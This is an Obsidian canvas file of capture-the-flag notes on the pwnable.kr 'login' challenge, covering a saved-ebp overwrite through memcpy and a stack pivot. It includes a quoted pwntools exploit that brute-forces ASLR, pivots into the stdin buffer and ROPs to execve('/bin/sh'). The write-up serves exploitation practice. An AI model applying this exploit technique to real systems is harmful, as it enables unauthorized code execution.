{
	"nodes":[
		{"id":"909d419814e8b606","x":-360,"y":-520,"width":1000,"height":700,"type":"text","text":"# understanding the challenge\n\nwe get a server on port 9003. You give it a string and it returns it's hash...\n\nThe program\n1. `scanf` a 30 byte string, Then base64 decode it.\n2. if the `decoded_str` is bigger than 12 (I guess it 12 bytes...) we exit\n3. otherwise we `memcpy`  the `decoded_str` to `input` in the bss.\n4. if `auth` returns true (1) then we open a shell with `correct`\n\n## auth\n* `memcpy` that overflows `ebp` on the stack\n* calculates the md5 of `buff`.  (not the buffer we inputted)\n* returns true if it's equal to `f87cd601aa7fedca99018a8be88eda34`"},
		{"id":"fc0b229d25b19ae2","x":-1360,"y":-360,"width":920,"height":560,"color":"5","type":"text","text":"# hints\n*Can you get authentication from this server?*\n\n```bash\n[*] '/mnt/c/Users/reemp/Desktop/not-giving-a-fuck/login/login'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\nlogin is a big file with a lot of functions... (you could ROP chain it to shell)\n\nthe MD5 version is `MD5 part of OpenSSL 1.0.1e 11 Feb 2013`\n"},
		{"id":"1a0f97cd3d90776f","x":-1006,"y":480,"width":566,"height":256,"type":"text","text":"# `gdb`\n\n```\nb *0x0804930B - auth leave\n```"},
		{"id":"5f75ff9d62d50e72","x":-160,"y":524,"width":880,"height":516,"type":"text","text":"# main ability - change `ebp`\n\nusing the `memcpy` inside `auth` we can overwrite the `ebp` of main. Meaning we can change `esp` after main to any value. \n\n### idea\n1. change `ebp` to `input_addr` - 4.\n2. put inside the input the address of `correct`\n`[correct_addr][4 bytes padding][input_addr - 4]`\n\ncorrect checks the payload to be `deadbeef` let's jump over that check :)\n"},
		{"id":"6e3e5fe6e4367b10","x":-340,"y":1160,"width":1120,"height":2420,"type":"text","text":"# writeups\n\nI could change the payload\n`[0xdeadbeef][correct_addr][input_addr]`\n\n## `mebeim`\nThe idea is to change the stack to stdin. Then just organize the stack parameter and jump to `execve`\n```python\n#!/usr/bin/env python3\n#\n# @mebeim - 2020-11-12\n#\n# I like unintended solutions, and exploiting stuff through stupid global\n# variables in BSS is boring! Turns out, you don't even need BSS for this.\n#\n# glibc is dumb, it will allocate a buffer for stdin (and do buffered reads)\n# even if we tell it not to do it explicitly through setvbuf(), LOL!\n# We are on 32bit so the stdin buf is always at 7FFxx000. One byte of ASLR\n# is pretty easy to guess. Since the reads are still buffered, the program\n# will initially read up to BUFSIZ bytes (I think the default is 4096).\n#\n# Send b64('aaaabbbb' + p32(guessed_stdin_buf_ptr)) + '\\n' + addr + arguments\n# for execve. The '\\n' in there is just to stop the first scanf() in main\n# (otherwise the length check after decoding from b64 fails). The program will\n# stack pivot into stdin buf and execute the chain when main returns.\n#\n\nimport sys\nfrom base64 import b64encode\nfrom pwn import *\n\ndef connect(prev_conn=None):\n\tif prev_conn is not None:\n\t\tprev_conn.close()\n\treturn remote('pwnable.kr', 9003)\n\nr = None\np = log.progress('Attempt')\nn = 0\n\nwhile 1:\n\tn += 1\n\tp.status('%d', n)\n\n\twith context.local(log_level='error'):\n\t\tr = connect(r)\n\n\t# Stack flip into stdin buffer (stdin->_IO_read_base).\n\t# Always starts with f77 and ends with 000 => only 1 ASLR byte to guess, ez.\n\tguessed_stdin_buf = 0xf7767000\n\tchain = [\n\t\t0x0807bb50              , # guessed_stdin_buf + 0x20 execve address\n\t\t0x44444444              , # guessed_stdin_buf + 0x24 fake ebp\n\t\tguessed_stdin_buf + 0x3c, # guessed_stdin_buf + 0x28 path\n\t\tguessed_stdin_buf + 0x34, # guessed_stdin_buf + 0x2c argv\n\t\tguessed_stdin_buf + 0x38, # guessed_stdin_buf + 0x30 envp\n\t\tguessed_stdin_buf + 0x3c, # guessed_stdin_buf + 0x34 argv[0], envp[0]\n\t\t0x00000000              , # guessed_stdin_buf + 0x38 null ptr\n\t\t# binsh                     guessed_stdin_buf + 0x3c\n\t]\n\n\tx = b64encode(b'aaaabbbb' + p32(guessed_stdin_buf + 0x1c)) + b'\\n'\n\tr.send(x.ljust(0x20) + b''.join(map(p32, chain)) + b'/bin/sh\\x00')\n\tr.sendline('cat flag')\n\n\ttry:\n\t\tr.recvline() # Useless prompt\n\t\tprint(r.recvline().decode()) # Flag if successful, EOFError if dead.\n\t\tp.success('%d', n)\n\t\tbreak\n\texcept EOFError:\n\t\tcontinue\n```\n\n"}
	],
	"edges":[
		{"id":"26b1522a2f318203","fromNode":"5f75ff9d62d50e72","fromSide":"bottom","toNode":"6e3e5fe6e4367b10","toSide":"top"}
	]
}